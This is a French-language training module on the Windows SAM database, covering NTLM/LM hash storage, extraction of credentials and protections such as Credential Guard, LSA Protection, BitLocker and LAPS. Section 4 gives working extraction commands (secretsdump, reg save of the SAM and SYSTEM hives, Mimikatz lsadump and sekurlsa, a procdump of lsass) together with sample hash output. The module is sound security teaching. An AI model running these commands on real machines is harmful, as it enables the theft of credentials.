# Le Security Account Manager (SAM)

**Module** : sécurité Windows -- gestion des comptes locaux et stockage des credentials

---

## Objectifs du module

À l'issue de ce module, les compétences suivantes seront acquises :

- Comprendre le rôle de la base SAM dans le modèle de sécurité Windows
- Connaître le format de stockage des mots de passe (hashes NTLM)
- Identifier les méthodes d'extraction des credentials depuis la SAM
- Mettre en oeuvre les protections adaptées contre le vol de credentials

---

## 1. Présentation de la base SAM

### 1.1 Rôle et périmètre

Le **Security Account Manager** (SAM) est la base de données locale qui stocke les informations de comptes utilisateurs et de groupes sur une machine Windows. Elle est utilisée exclusivement pour les **comptes locaux** -- les comptes de domaine Active Directory sont gérés par le fichier `NTDS.dit` sur les contrôleurs de domaine.

La SAM contient les informations suivantes pour chaque compte local :

| Information | Description |
|---|---|
| **Nom d'utilisateur** | Nom du compte local |
| **Hash NTLM** | Hash du mot de passe (NT hash, basé sur MD4) |
| **Hash LM** *(optionnel)* | Hash LAN Manager, désactivé par défaut depuis Windows Vista |
| **RID** | Relative Identifier, identifiant numérique unique du compte |
| **Appartenance aux groupes** | Groupes locaux dont le compte est membre |
| **Dernière connexion** | Horodatage de la dernière authentification réussie |
| **Métadonnées** | État du compte (activé/désactivé), expiration du mot de passe, etc. |

### 1.2 RIDs remarquables

Certains RIDs sont réservés et identiques sur toutes les installations Windows :

| RID | Compte |
|---|---|
| **500** | Administrateur intégré (Administrator) |
| **501** | Invité (Guest) |
| **502** | krbtgt (uniquement sur les contrôleurs de domaine) |
| **1000+** | Comptes utilisateurs créés manuellement |

> **À noter** : le compte Administrator (RID 500) possède des propriétés spéciales dans Windows. Même s'il est renommé, son RID reste 500 et il bénéficie de certains comportements privilégiés (ex. il n'est pas soumis à l'UAC de la même manière que les autres comptes administrateurs).

---

## 2. Emplacement et protection de la SAM

### 2.1 Emplacement sur le disque

La base SAM est stockée dans un fichier système à l'emplacement suivant :

```
C:\Windows\System32\config\SAM
```

Ce fichier est **verrouillé en permanence** par le système d'exploitation tant que Windows est en cours d'exécution. Aucun processus utilisateur ne peut le lire directement, même avec des droits administrateur.

La SAM est également montée dans le registre Windows à la clé suivante :

```
HKLM\SAM
```

Par défaut, seul le compte SYSTEM peut accéder à cette ruche de registre. Un administrateur local peut modifier les permissions pour y accéder, mais cela n'est pas recommandé.

### 2.2 Le fichier SYSTEM et la SysKey

Les hashes stockés dans la SAM ne sont pas en clair : ils sont chiffrés avec une clé dérivée de la **SysKey** (aussi appelée Boot Key). Cette clé est stockée dans un autre fichier de la même arborescence :

```
C:\Windows\System32\config\SYSTEM
```

Pour extraire et déchiffrer les hashes de la SAM, un attaquant a besoin des **deux fichiers** : SAM et SYSTEM. Obtenir uniquement le fichier SAM ne suffit pas.

---

## 3. Stockage des mots de passe

### 3.1 Le hash NT (NTLM)

Le processus de stockage du mot de passe dans la SAM suit les étapes suivantes :

```
1. L'utilisateur saisit son mot de passe : "MonMotDePasse123"
       |
       v
2. Conversion en UTF-16LE (encodage Unicode Little-Endian)
       |
       v
3. Calcul du hash MD4
       |
       v
4. Résultat : hash NT (32 caractères hexadécimaux)
   Exemple : a4f49c406510bdcab6824ee7c30fd852
       |
       v
5. Chiffrement avec la SysKey (dérivée du fichier SYSTEM)
       |
       v
6. Stockage dans la SAM
```

> **À noter** : le hash NT (souvent appelé "hash NTLM") n'utilise aucun sel (salt). Cela signifie que deux utilisateurs ayant le même mot de passe auront le même hash NT, ce qui rend les attaques par tables arc-en-ciel (rainbow tables) possibles. De plus, MD4 est un algorithme rapide, ce qui facilite les attaques par force brute.

### 3.2 Le hash LM (LAN Manager)

Le hash LM est un format de hachage hérité des anciennes versions de Windows (avant Vista). Il est **désactivé par défaut** sur les systèmes modernes car il présente des faiblesses majeures :

| Faiblesse | Description |
|---|---|
| **Conversion en majuscules** | Le mot de passe est converti en majuscules avant le hachage, réduisant considérablement l'espace de recherche |
| **Division en deux blocs** | Le mot de passe est divisé en deux blocs de 7 caractères, chacun haché indépendamment |
| **Longueur maximale** | Limité à 14 caractères |
| **Algorithme faible** | Basé sur DES |

En pratique, un hash LM peut être cassé en quelques secondes avec du matériel moderne. C'est pourquoi Microsoft l'a désactivé par défaut à partir de Windows Vista.

> **Bonne pratique** : vérifier que les hashes LM sont bien désactivés via la stratégie de groupe : `Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options > Network security: Do not store LAN Manager hash value on next password change` doit être à **Enabled**.

---

## 4. Extraction des credentials

### 4.1 Extraction offline

L'extraction offline consiste à accéder aux fichiers SAM et SYSTEM en dehors de l'exécution normale de Windows, contournant ainsi le verrouillage du fichier.

**Méthode 1 : démarrage depuis un support Linux**

1. Démarrer la machine sur un Live USB Linux (ex. Kali Linux)
2. Monter la partition Windows
3. Copier les fichiers `SAM` et `SYSTEM` depuis `Windows/System32/config/`
4. Utiliser un outil comme `samdump2` ou `impacket-secretsdump` pour extraire les hashes

```bash
# Sur Linux, après avoir copié les fichiers
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Résultat typique :

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4f49c406510bdcab6824ee7c30fd852:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
alice:1001:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
```

Le format est : `nom:RID:hash_LM:hash_NT:::`

La valeur `aad3b435b51404eeaad3b435b51404ee` correspond au hash LM vide (LM désactivé).

### 4.2 Extraction live avec reg save

Sur un système en cours d'exécution, un administrateur peut exporter les ruches de registre SAM et SYSTEM :

```cmd
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

Ces fichiers peuvent ensuite être analysés offline avec les mêmes outils.

### 4.3 Extraction live avec Mimikatz

**Mimikatz** est un outil d'extraction de credentials développé par Benjamin Delpy. Il peut extraire les hashes directement depuis la mémoire du processus LSASS.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM
...

mimikatz # lsadump::sam
Domain : DESKTOP-ABC123
SysKey : 1a2b3c4d5e6f...

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a4f49c406510bdcab6824ee7c30fd852

RID  : 000003e9 (1001)
User : alice
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
```

Les trois commandes effectuent les opérations suivantes :

1. `privilege::debug` : active le privilege `SeDebugPrivilege` sur le token courant
2. `token::elevate` : impersonne le token SYSTEM pour obtenir les droits nécessaires
3. `lsadump::sam` : lit les hashes depuis la ruche SAM du registre

### 4.4 Dump de la mémoire LSASS

Une alternative consiste à capturer la mémoire du processus LSASS pour une analyse ultérieure. L'outil `procdump.exe` (Sysinternals) peut être utilisé :

```cmd
procdump.exe -ma lsass.exe C:\temp\lsass.dmp
```

Le fichier `.dmp` résultant peut ensuite être analysé hors ligne avec Mimikatz :

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords
```

> **À noter** : cette technique est fréquemment utilisée par les attaquants car `procdump.exe` est un outil légitime signé par Microsoft, ce qui lui permet de contourner certaines solutions antivirus.

---

## 5. Protections

### 5.1 Mesures de protection recommandées

| Protection | Description |
|---|---|
| **Credential Guard** | Isole les credentials LSASS dans un environnement virtualisé (VBS), empêchant leur extraction même par un processus SYSTEM |
| **LSA Protection** | Active le mode Protected Process Light (PPL) pour LSASS, bloquant l'injection de code et le dump mémoire |
| **BitLocker** | Chiffre le disque système, empêchant l'extraction offline des fichiers SAM et SYSTEM |
| **Politique de mots de passe** | Mots de passe longs et complexes pour rendre le cracking des hashes plus difficile |
| **Désactivation de LM** | Vérifier que les hashes LM ne sont pas stockés (défaut depuis Vista) |
| **LAPS** | Local Administrator Password Solution -- mots de passe administrateur locaux uniques par machine, empêchant le mouvement latéral via hash reuse |

### 5.2 Activer LSA Protection

Pour activer la protection du processus LSASS (mode PPL) :

```powershell
# Créer la clé de registre
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "RunAsPPL" -Value 1 -PropertyType DWORD -Force
```

Après redémarrage, LSASS s'exécute en mode Protected Process Light et les tentatives de dump mémoire sont bloquées.

---

## Pour aller plus loin

- [Microsoft -- Security Account Manager](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-account-manager)
- [Microsoft -- Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)
- [Microsoft -- Configuring Additional LSA Protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [Mimikatz -- Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Microsoft -- LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
